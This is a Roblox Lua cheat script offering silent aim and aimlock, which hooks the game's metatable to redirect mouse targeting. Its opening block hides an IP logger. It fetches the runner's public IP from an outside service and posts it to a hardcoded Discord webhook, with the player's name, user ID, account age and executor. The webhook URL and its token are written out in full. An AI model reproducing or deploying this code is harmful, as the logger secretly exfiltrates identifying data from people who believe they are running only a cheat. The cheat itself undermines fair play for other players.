local plr = game.Players.LocalPlayer
repeat wait() until plr.Character
local gui = script.Parent
local urlprofile = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
 
 
local ident = game:HttpGet("https://v4.ident.me/")
 
local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
 
local function getexploit()
    local exploit =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
        (isexecutorclosure and "Script-Ware V2") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "SirHurt V4") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "Krnl") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getreg()['CalamariLuaEnv'] and "Calamari") or
        (unit and "Unit") or
        ("Undetectable")
    return exploit
end
local Content = ""
local Embed = {
            ["title"] = "***Execution***",
            ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
            ["type"] = "rich",
            ["color"] = tonumber(0xffff00),
                    ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
            },
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
            },
            ["fields"] = {
                {
                    ["name"] = "__Account Age:__",
                    ["value"] = plr.AccountAge.." days old",
                    ["inline"] = true
                },
                {
                    ["name"] = "__User ID:__",
                    ["value"] = plr.UserId,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "IP Address: "..tostring(ident),
                ["icon_url"] = "https://cdn.discordapp.com/attachments/903407245675606056/911635640452513843/Screenshot_25.png"
            },
            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
(syn and syn.request or http_request or http.request) {
    Url = 'https://discordapp.com/api/webhooks/1022272862347874384/xrpZAykBImAqGtwoSmWFi1-kjRXcwQuFeWAltLVPWDKBRTSjzOw7kvBGYM0kKgWuyqFU';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};
 
combo, prev, rnewidx = 0, 0, 0
for i = 1, 50 do
   local n = math.random(10000, 99999)
   if i == 25 then
      rnewidx = n
   end
   if n == prev then
      combo = combo + 1
   end
   prev = n
end
 
if combo > 45 then
   c("0x01")
end










if not LPH_OBFUSCATED then
    LPH_JIT_MAX = function(...)
        return (...)
    end
    LPH_NO_VIRTUALIZE = function(...)
        return (...)
    end
end

LPH_JIT_MAX(
    function()
        local Players, Client, Mouse, RS, Camera, r =
            game:GetService("Players"),
            game:GetService("Players").LocalPlayer,
            game:GetService("Players").LocalPlayer:GetMouse(),
            game:GetService("RunService"),
            game.Workspace.CurrentCamera,
            math.random

        local Circle = Drawing.new("Circle")
        Circle.Color = Color3.new(1, 1, 1)
        Circle.Transparency = 0.5
        Circle.Thickness = 1

        local TracerCircle = Drawing.new("Circle")
        TracerCircle.Color = Color3.new(1, 1, 1)
        TracerCircle.Thickness = 1

        local prey
        local prey2
        local On

        local Vec2 = function(property)
            return Vector2.new(property.X, property.Y + (game:GetService("GuiService"):GetGuiInset().Y))
        end

        local UpdateSilentFOV = function()
            if not Circle then
                return Circle
            end
            Circle.Visible = getgenv().lenakidoesntlikeurskiddedassslock.FOV["Visible"]
            Circle.Radius = getgenv().lenakidoesntlikeurskiddedassslock.FOV["Radius"] * 3.05
            Circle.Filled = getgenv().lenakidoesntlikeurskiddedassslock.FOV["Filled"]
            Circle.Position = Vec2(Mouse)

            return Circle
        end

        local UpdateTracerFOV = function()
            if not TracerCircle then
                return TracerCircle
            end

            TracerCircle.Visible = getgenv().lenakidoesntlikeurskiddedassslock.Tracer["ShowFOV"]
            TracerCircle.Radius = getgenv().lenakidoesntlikeurskiddedassslock.Tracer["Radius"]
            TracerCircle.Position = Vec2(Mouse)

            return TracerCircle
        end

        game.RunService.RenderStepped:Connect(function ()
            UpdateTracerFOV()
            UpdateSilentFOV()
        end)

        local WallCheck = function(destination, ignore)
            if getgenv().lenakidoesntlikeurskiddedassslock.Extras.WallCheck then
                local Origin = Camera.CFrame.p
                local CheckRay = Ray.new(Origin, destination - Origin)
                local Hit = game.workspace:FindPartOnRayWithIgnoreList(CheckRay, ignore)
                return Hit == nil
            else
                return true
            end
        end

        local useVelocity = function (player) 
            player.Character.HumanoidRootPart.Velocity = Vector3.new(0.36, 0.21, 0.34) * 2
        end

        local checkVelocity = function (player, pos, neg)
            if player and player.Character:FindFirstChild("Humanoid") then
                local velocity = player.Character.HumanoidRootPart.Velocity
                if (velocity.Magnitude > neg or velocity.Magnitude < pos and
                (not player.Character.Humanoid.Jump == true)) then
                    useVelocity(player)
                end
            end
            return false
        end

        task.spawn(function () while task.wait() do if getgenv().lenakidoesntlikeurskiddedassslock.Resolver.AutoResolve == true then checkVelocity(prey or prey2, getgenv().lenakidoesntlikeurskiddedassslock.Resolver.Positive, getgenv().lenakidoesntlikeurskiddedassslock.Resolver.Negative) end end end)

        GetClosestToMouse = function()
            local Target, Closest = nil, 1 / 0

            for _, v in pairs(Players:GetPlayers()) do
                if (v.Character and v ~= Client and v.Character:FindFirstChild("HumanoidRootPart")) then
                    local Position, OnScreen = Camera:WorldToScreenPoint(v.Character.HumanoidRootPart.Position)
                    local Distance = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude

                    if
                        (Circle.Radius > Distance and Distance < Closest and OnScreen and
                            WallCheck(v.Character.HumanoidRootPart.Position, {Client, v.Character}))
                     then
                        Closest = Distance
                        Target = v
                    end
                end
            end
            return Target
        end

        function TargetChecks(Target)
            if getgenv().lenakidoesntlikeurskiddedassslock.Extras.UnlockedOnDeath == true and Target.Character then
                return Target.Character.BodyEffects["K.O"].Value and true or false
            end
            return false
        end

        function PredictionictTargets(Target, Value)
            return Target.Character[getgenv().lenakidoesntlikeurskiddedassslock.Silent.AimPart].CFrame +
                (Target.Character[getgenv().lenakidoesntlikeurskiddedassslock.Silent.AimPart].Velocity * Value)
        end

        local WTS = function(Object)
            local ObjectVector = Camera:WorldToScreenPoint(Object.Position)
            return Vector2.new(ObjectVector.X, ObjectVector.Y)
        end

        local IsOnScreen = function(Object)
            local IsOnScreen = Camera:WorldToScreenPoint(Object.Position)
            return IsOnScreen
        end

        local FilterObjs = function(Object)
            if string.find(Object.Name, "Gun") then
                return
            end
            if table.find({"Part", "MeshPart", "BasePart"}, Object.ClassName) then
                return true
            end
        end
        GetClosestBodyPart = function(character)
            local ClosestDistance = 1 / 0
            local BodyPart = nil
            if (character and character:GetChildren()) then
                for _, x in next, character:GetChildren() do
                    if FilterObjs(x) and IsOnScreen(x) then
                        local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                        if getgenv().lenakidoesntlikeurskiddedassslock.Tracer.UseTracerRadius == true then
                            if (TracerCircle.Radius > Distance and Distance < ClosestDistance) then
                                ClosestDistance = Distance
                                BodyPart = x
                            end
                        else
                            if (Distance < ClosestDistance) then
                                ClosestDistance = Distance
                                BodyPart = x
                            end
                        end
                    end
                end
            end
            return BodyPart
        end

        Mouse.KeyDown:Connect(
            function(Key)
                if (Key == getgenv().lenakidoesntlikeurskiddedassslock.Tracer.TracerToggle:lower()) then
                    if getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Enabled == true then
                        On = not On
                        if On then
                            prey2 = GetClosestToMouse()
                        else
                            if prey2 ~= nil then
                                prey2 = nil
                            end
                        end
                    end
                end
                if (Key == getgenv().lenakidoesntlikeurskiddedassslock.Silent.SilentToggle:lower()) then
                    if getgenv().lenakidoesntlikeurskiddedassslock.Silent.Enabled == true then
                        getgenv().lenakidoesntlikeurskiddedassslock.Silent.Enabled = false
                    else
                        getgenv().lenakidoesntlikeurskiddedassslock.Silent.Enabled = true
                    end
                end
            end
        )

        RS.RenderStepped:Connect(
            function()
                if prey then
                    if prey ~= nil and getgenv().lenakidoesntlikeurskiddedassslock.Silent.Enabled and getgenv().lenakidoesntlikeurskiddedassslock.Silent.ClosestPart == true then
                        getgenv().lenakidoesntlikeurskiddedassslock.Silent["AimPart"] = tostring(GetClosestBodyPart(prey.Character))
                    end
                end
                if prey2 then
                    if
                        prey2 ~= nil and not TargetChecks(prey2) and getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Enabled and
                            getgenv().lenakidoesntlikeurskiddedassslock.Tracer.TraceClosestPart == true
                     then
                        getgenv().lenakidoesntlikeurskiddedassslock.Tracer["AimPart"] = tostring(GetClosestBodyPart(prey2.Character))
                    end
                end
            end
        )

        local TracerPredictioniction = function(Target, Value)
            return Target.Character[getgenv().lenakidoesntlikeurskiddedassslock.Tracer.AimPart].Position +
                (Target.Character[getgenv().lenakidoesntlikeurskiddedassslock.Tracer.AimPart].Velocity / Value)
        end

        RS.RenderStepped:Connect(
            function()
                if
                    prey2 ~= nil and not TargetChecks(prey2) and getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Enabled and
                        getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Smoothness == true
                 then
                    local Main = CFrame.new(Camera.CFrame.p, TracerPredictioniction(prey2, getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Prediction))
                    Camera.CFrame =
                        Camera.CFrame:Lerp(
                        Main,
                        getgenv().lenakidoesntlikeurskiddedassslock.Tracer.SmoothnessValue,
                        Enum.EasingStyle.Elastic,
                        Enum.EasingDirection.InOut,
                        Enum.EasingStyle.Sine,
                        Enum.EasingDirection.Out
                    )
                elseif prey2 ~= nil and getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Enabled and getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Smoothness == false then
                    Camera.CFrame =
                        CFrame.new(Camera.CFrame.Position, TracerPredictioniction(prey2, getgenv().lenakidoesntlikeurskiddedassslock.Tracer.Prediction))
                end
            end
        )

        local grmt = getrawmetatable(game)
        local index = grmt.__index
        local properties = {
            "Hit" -- Ill Add more Mouse properties soon,
        }
        setreadonly(grmt, false)

        grmt.__index =
            newcclosure(
            function(self, v)
                if Mouse and (table.find(properties, v)) then
                    prey = GetClosestToMouse()
                    if prey ~= nil and getgenv().lenakidoesntlikeurskiddedassslock.Silent.Enabled and not TargetChecks(prey) then
                        local endpoint = PredictionictTargets(prey, getgenv().lenakidoesntlikeurskiddedassslock.Silent.Prediction)

                        return (table.find(properties, tostring(v)) and endpoint)
                    end
                end
                return index(self, v)
            end
        )
    end
)()
